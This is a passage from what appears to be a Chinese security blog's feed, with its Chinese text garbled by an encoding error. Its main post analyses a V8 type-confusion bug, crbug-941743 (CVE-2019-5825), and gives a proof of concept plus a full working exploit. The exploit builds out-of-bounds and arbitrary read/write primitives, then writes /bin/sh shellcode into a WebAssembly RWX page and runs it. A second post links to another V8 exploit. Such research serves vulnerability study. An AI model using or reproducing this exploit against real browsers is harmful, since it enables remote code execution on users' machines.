 <span class="keyword">return</span> a.map(<span class="function"><span class="params">v</span> =&gt;</span> v);</span><br><span class="line">&#125;</span><br><span class="line">mapping(a);</span><br><span class="line">mapping(a);</span><br><span class="line">%OptimizeFunctionOnNextCall(mapping);</span><br><span class="line">mapping(a);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now lengthen the array, but ensure that it points to a non-dictionary</span></span><br><span class="line"><span class="comment">// backing store.</span></span><br><span class="line">a.length = (<span class="number">32</span> * <span class="number">1024</span> * <span class="number">1024</span>)-<span class="number">1</span>;</span><br><span class="line">a.fill(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">a.push(<span class="number">2</span>);</span><br><span class="line">a.length += <span class="number">500</span>;</span><br><span class="line"><span class="comment">// Now, the non-inlined array constructor should produce an array with</span></span><br><span class="line"><span class="comment">// dictionary elements: causing a crash.</span></span><br><span class="line">mapping(a);</span><br></pre></td></tr></table></figure><h2 id="3-bug-analysis"><a href="#3-bug-analysis" class="headerlink" title="3. bug analysis"></a>3. bug analysis</h2><p>ä½œè€…çš„åˆ†æ:</p><ol><li>The optimization of JSCreateArray (for |a2|) bailout at typed lowering phase. When executing JITed code, it calls to |Runtime_NewArray|. </li><li>Thereâ€™s a CheckMaps for |arr|, but it canâ€™t ensure an array that produced by |arr| is the same type. For example, |arr| is extended by |push| and it has PACKED_SMI_ELEMENTS, but |a2| could be constructed by |Runtime_NewArray| and it could have DICTIONARY_ELEMENTS. </li><li>TransitionAndStoreElement assumes the source array should be HOLEY_SMI_ELEMENTS, this canâ€™t ensure either. Because when calling to |Runtime_NewArray| and arrayâ€™s actual length &gt;= 0x4000000, thereâ€™ll be a dictionary elements array. So our bug occurs.</li></ol><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Chrome-M73-issue-941743/15910826407633.jpg"></p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Chrome-M73-issue-941743/15904673688147.jpg"></p><p><a href="https://cy2cs.top/2020/04/20/issue-941743-cve-2019-5825/">issue-941743-cve-2019-5825</a></p><p>ä¸ºä»€ä¹ˆå¼€å§‹éœ€è¦ä¸€ä¸ª<code> Array(2 ** 30)</code></p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/Chrome-M73-issue-941743/15910830837266.jpg"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (argv.length() == <span class="number">1</span>) &#123;</span><br><span class="line">  Handle&lt;Object&gt; argument_one = argv.at&lt;Object&gt;(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (argument_one-&gt;IsSmi()) &#123;</span><br><span class="line">    <span class="keyword">int</span> value = Handle&lt;Smi&gt;::cast(argument_one)-&gt;value();</span><br><span class="line">    <span class="keyword">if</span> (value &lt; <span class="number">0</span> ||</span><br><span class="line">        JSArray::SetLengthWouldNormalize(isolate-&gt;heap(), value)) &#123;</span><br><span class="line">      <span class="comment">// the array is a dictionary in this case.</span></span><br><span class="line">      can_use_type_feedback = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value != <span class="number">0</span>) &#123;</span><br><span class="line">      holey = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">if</span> (value &gt;= JSArray::kInitialMaxFastElementArray) &#123;</span><br><span class="line">        can_inline_array_constructor = <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Non-smi length argument produces a dictionary</span></span><br><span class="line">    can_use_type_feedback = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åªè¦<code>can_use_type_feedback = false; </code>å³å¯ã€‚</p><h2 id="4-how-to-exploit"><a href="#4-how-to-exploit" class="headerlink" title="4. how to exploit?"></a>4. how to exploit?</h2><p>æ„é€ <code>oobarray</code>ï¼Œåˆ©ç”¨<code>oobarray</code>å»ä¿®æ”¹åé¢<code>arraybuffer</code>é•¿åº¦ç”¨æ¥ä»»æ„åœ°å€è¯»å†™ï¼Œåˆ©ç”¨<code>oobarray</code>è¯»å†™<code>leak_obj</code>å®ç°<code>addrof</code>å’Œ<code>fakeobj</code>åŸè¯­ã€‚s</p><h2 id="5-exploit"><a href="#5-exploit" class="headerlink" title="5. exploit"></a>5. exploit</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    exploit for crbug-941743</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">is_in_v8_flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// =================================================================</span></span><br><span class="line"><span class="comment">// tookit</span></span><br><span class="line"><span class="comment">// =================================================================</span></span><br><span class="line"><span class="keyword">var</span> g_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> g_float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(g_buffer);</span><br><span class="line"><span class="keyword">var</span> g_uint64 = <span class="keyword">new</span> BigUint64Array(g_buffer);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">float2address</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  g_float64[<span class="number">0</span>] = f;</span><br><span class="line">  <span class="keyword">return</span> g_uint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">address2float</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> i = BigInt(addr);</span><br><span class="line">  g_uint64[<span class="number">0</span>] = i;</span><br><span class="line">  <span class="keyword">return</span> g_float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + i.toString(<span class="number">16</span>).padStart(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">info</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;[+] &#x27;</span> + msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">error</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;[-] &#x27;</span> + msg);</span><br><span class="line">  exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myprint</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_in_v8_flag)&#123;</span><br><span class="line">        print(msg);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// =================================================================</span></span><br><span class="line"><span class="comment">// exploit part</span></span><br><span class="line"><span class="comment">// =================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> max_iters = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">var</span> max_search = <span class="number">0x10000</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>(<span class="number">32760</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// This call ensures that TurboFan won&#x27;t inline array constructors.</span></span><br><span class="line"><span class="built_in">Array</span>(<span class="number">2</span>**<span class="number">30</span>);</span><br><span class="line"><span class="comment">// Set up a fast holey smi array, and generate optimized code.</span></span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>, <span class="number">2</span>, ,,, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> oob_array;</span><br><span class="line"><span class="keyword">let</span> leak_obj;</span><br><span class="line"><span class="keyword">let</span> rw_arraybuffer;</span><br><span class="line"><span class="keyword">let</span> obj = &#123;&#125;; <span class="comment">//using for leak_obj</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> oob_array_length_offset = <span class="number">23</span>;  <span class="comment">// get this by debugging</span></span><br><span class="line"><span class="keyword">let</span> oob_array_storage_length_offset = oob_array_length_offset - <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inline</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.map(</span><br><span class="line">        (value, index) =&gt;&#123;</span><br><span class="line">            <span class="keyword">if</span> (index == <span class="number">0</span>)&#123;</span><br><span class="line">                oob_array = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line"></span><br><span class="line">                leak_obj = &#123;<span class="attr">m</span>:address2float(<span class="number">0xdeadbeef</span>), <span class="attr">n</span>:obj&#125;;</span><br><span class="line">                rw_arraybuffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x4321</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (index == oob_array_length_offset +<span class="number">1</span> )&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="string">&quot;oob finished...&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> index;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inline();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; max_iters; ++i) inline();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now lengthen the array, but ensure that it points to a non-dictionary</span></span><br><span class="line"><span class="comment">// backing store.</span></span><br><span class="line">a.length = (<span class="number">32</span> * <span class="number">1024</span> * <span class="number">1024</span>)-<span class="number">1</span>;</span><br><span class="line">a.fill(<span class="number">1</span>, oob_array_storage_length_offset, oob_array_storage_length_offset + <span class="number">1</span>);</span><br><span class="line">a.fill(<span class="number">1</span>, oob_array_length_offset);</span><br><span class="line">a.length += <span class="number">500</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_obj_offset = <span class="number">0</span>;</span><br><span class="line">rw_arraybuffer_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrOf</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    leak_obj.n = obj;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Number</span>(float2address(oob_array[leak_obj_offset]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObj</span>(<span class="params">obj_address</span>)</span>&#123;</span><br><span class="line">    oob_array[leak_obj_offset] = <span class="built_in">Number</span>(float2address(obj_address));</span><br><span class="line">    <span class="keyword">return</span> leak_obj.n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">    oob_array[rw_arraybuffer_offset] = address2float(addr);</span><br><span class="line">    <span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(rw_arraybuffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Number</span>(float2address(data_view.getFloat64(<span class="number">0</span>, <span class="literal">true</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// function write64(addr, value)&#123;</span></span><br><span class="line"><span class="comment">//     oob_array[rw_arraybuffer_offset] = address2float(addr);</span></span><br><span class="line"><span class="comment">//     let data_view = new DataView(rw_arraybuffer);</span></span><br><span class="line"><span class="comment">//     data_view.setFloat64(0, float2address(value), true);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write32</span>(<span class="params">addr, value</span>)</span>&#123;</span><br><span class="line">    oob_array[rw_arraybuffer_offset] = address2float(addr);</span><br><span class="line">    <span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(rw_arraybuffer);</span><br><span class="line">    data_view.setInt32(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line"><span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">10</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    inline();</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="keyword">if</span>(oob_array.length &gt; <span class="number">2</span>)&#123;</span><br><span class="line">        myprint(<span class="string">&quot;[+] oob successed!&quot;</span>);</span><br><span class="line">        myprint(<span class="string">&quot;[+] oob_array length is : &quot;</span> + oob_array.length);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;oob Failed&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; max_search; ++i)&#123;</span><br><span class="line">        <span class="keyword">var</span> value = float2address(oob_array[i]);</span><br><span class="line">        <span class="keyword">if</span>(value == <span class="number">0xdeadbeef</span>)&#123;</span><br><span class="line">            leak_obj_offset = i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; max_search; ++i)&#123;</span><br><span class="line">        <span class="keyword">var</span> value = float2address(oob_array[i]);</span><br><span class="line">        <span class="keyword">if</span>(value == <span class="number">0x4321</span>)&#123;</span><br><span class="line">            rw_arraybuffer_offset = i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(leak_obj_offset == <span class="number">0</span> || rw_arraybuffer_offset==<span class="number">0</span>) <span class="keyword">throw</span> <span class="string">&quot;get offset failed&quot;</span></span><br><span class="line"></span><br><span class="line">    myprint(<span class="string">&quot;[+] leak_obj_offset : &quot;</span> + leak_obj_offset);</span><br><span class="line">    myprint(<span class="string">&quot;[+] rw_arraybuffer_offset : &quot;</span> + rw_arraybuffer_offset);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> wasm_func_addr = addrOf(func) - <span class="number">1</span>;</span><br><span class="line">    myprint(<span class="string">&quot;[+] wasm func addr : &quot;</span> + hex(wasm_func_addr));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> shared_info = read64(wasm_func_addr + <span class="number">0x18</span>) - <span class="number">1</span>;</span><br><span class="line">    myprint(<span class="string">&quot;[+] wasm shared info : &quot;</span> + hex(shared_info));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> data_address = read64(shared_info + <span class="number">0x8</span>) - <span class="number">1</span>;</span><br><span class="line">    myprint(<span class="string">&quot;[+] data_address : &quot;</span> + hex(data_address));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> instance_address = read64(data_address + <span class="number">0x10</span>) - <span class="number">1</span>;</span><br><span class="line">    myprint(<span class="string">&quot;[+] instance_address : &quot;</span> + hex(instance_address));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> rwx_address = read64(instance_address + <span class="number">0x108</span>);</span><br><span class="line">    myprint(<span class="string">&quot;[+] rwx_address : &quot;</span> + hex(rwx_address));</span><br><span class="line">    <span class="comment">// %DebugPrint(func);</span></span><br><span class="line">    <span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line">    write32(rwx_address, <span class="number">0x99583b6a</span>);</span><br><span class="line">    write32(rwx_address + <span class="number">0x4</span>, <span class="number">0x2fbb4852</span>);</span><br><span class="line">    write32(rwx_address + <span class="number">0x8</span>, <span class="number">0x6e69622f</span>);</span><br><span class="line">    write32(rwx_address + <span class="number">0xc</span>, <span class="number">0x5368732f</span>);</span><br><span class="line">    write32(rwx_address + <span class="number">0x10</span>, <span class="number">0x57525f54</span>);</span><br><span class="line">    write32(rwx_address + <span class="number">0x14</span>, <span class="number">0x050f5e54</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// %SystemBreak();</span></span><br><span class="line">    <span class="comment">// let&#x27;s go to the shellcode </span></span><br><span class="line">    func();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6-reference"><a href="#6-reference" class="headerlink" title="6. reference"></a>6. reference</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=941743">crbug-941743</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1-bug-info&quot;&gt;&lt;a href=&quot;#1-bug-info&quot; class=&quot;headerlink&quot; title=&quot;1. bug info&quot;&gt;&lt;/a&gt;1. bug info&lt;/h2&gt;&lt;p&gt;è¿™æ˜¯ç§‘æ©å®éªŒå®¤19å¹´ blackhat USAè®®é¢˜ä¸­é‚£å¥—åˆ©ç”¨çš„rceéƒ¨åˆ†ï¼Œv8 JITä¼˜åŒ–çš„æ¼æ´ã€‚&lt;/p&gt;
&lt;p&gt;ç±»å‹æ··æ·†æ¼æ´ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="http://o0xmuhe.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="v8" scheme="http://o0xmuhe.me/tags/v8/"/>
    
    <category term="exploit" scheme="http://o0xmuhe.me/tags/exploit/"/>
    
    <category term="chrome" scheme="http://o0xmuhe.me/tags/chrome/"/>
    
  </entry>
  
  <entry>
    <title>crbug1051017 exploit</title>
    <link href="http://o0xmuhe.me/2020/06/05/crbug1051017-exploit/"/>
    <id>http://o0xmuhe.me/2020/06/05/crbug1051017-exploit/</id>
    <published>2020-06-05T11:30:27.000Z</published>
    <updated>2020-06-20T11:07:34.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="about"><a href="#about" class="headerlink" title="about"></a>about</h2><p>æœ€è¿‘çœ‹åˆ°<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017">crbug 1051017</a>å…¬å¼€äº†pocï¼Œè¿™æ˜¯ä¸€ä¸ªå“ç›¸å¾ˆå¥½çš„ç±»å‹æ··æ·†ï¼Œå…·ä½“å¯ä»¥çœ‹åŸä½œè€…çš„æ¼æ´æŠ¥å‘Šï¼Œå†™å¾—ååˆ†è¯¦ç»†ã€‚</p><a id="more"></a><h2 id="how2exploit"><a href="#how2exploit" class="headerlink" title="how2exploit"></a>how2exploit</h2><p>å› ä¸º<code>glazunov</code>çš„pocå·²ç»åšåˆ°äº†oob arrayé˜¶æ®µäº†ï¼Œæ‰€ä»¥é€šè¿‡å¸ƒå±€ä¸€ä¸ªBigUint64Arrayæ¥ä»»æ„åœ°å€è¯»å†™å³å¯ï¼Œå³åˆ©ç”¨æ–¹å¼å‚è€ƒ<code>CVE-2020-6418</code>å°±å¯ä»¥äº†ã€‚</p><h2 id="full-exploit"><a href="#full-exploit" class="headerlink" title="full exploit"></a>full exploit</h2><p><a href="https://github.com/o0xmuhe/RealWorldPwn/tree/master/chrome_M80_crbug1051017">exploit</a></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1051017">crbug 1051017</a><br><a href="https://ray-cp.github.io/archivers/browser-pwn-cve-2020-6418%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">browser-pwn-cve-2020-6418æ¼æ´åˆ†æ</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;about&quot;&gt;&lt;a href=&quot;#about&quot; class=&quot;headerlink&quot; title=&quot;about&quot;&gt;&lt;/a&gt;about&lt;/h2&gt;&lt;p&gt;æœ€è¿‘çœ‹åˆ°&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=1051017&quot;&gt;crbug 1051017&lt;/a&gt;å…¬å¼€äº†pocï¼Œè¿™æ˜¯ä¸€ä¸ªå“ç›¸å¾ˆå¥½çš„ç±»å‹æ··æ·†ï¼Œå…·ä½“å¯ä»¥çœ‹åŸä½œè€…çš„æ¼æ´æŠ¥å‘Šï¼Œå†™å¾—ååˆ†è¯¦ç»†ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="http://o0xmuhe.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="v8" scheme="http://o0xmuhe.me/tags/v8/"/>
    
    <category term="exploit" scheme="http://o0xmuhe.me/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>Cisco CDP cve-2020-3119</title>
    <link href="http://o0xmuhe.me/2020/04/23/Cisco-CDP-cve-2020-3119/"/>
    <id>http://o0xmuhe.me/2020/04/23/Cisco-CDP-cve-2020-3119/</id>
    <published>2020-04-23T03:30:56.000Z</published>
    <updated>2020-06-20T10:31:49.000Z</updated>
    
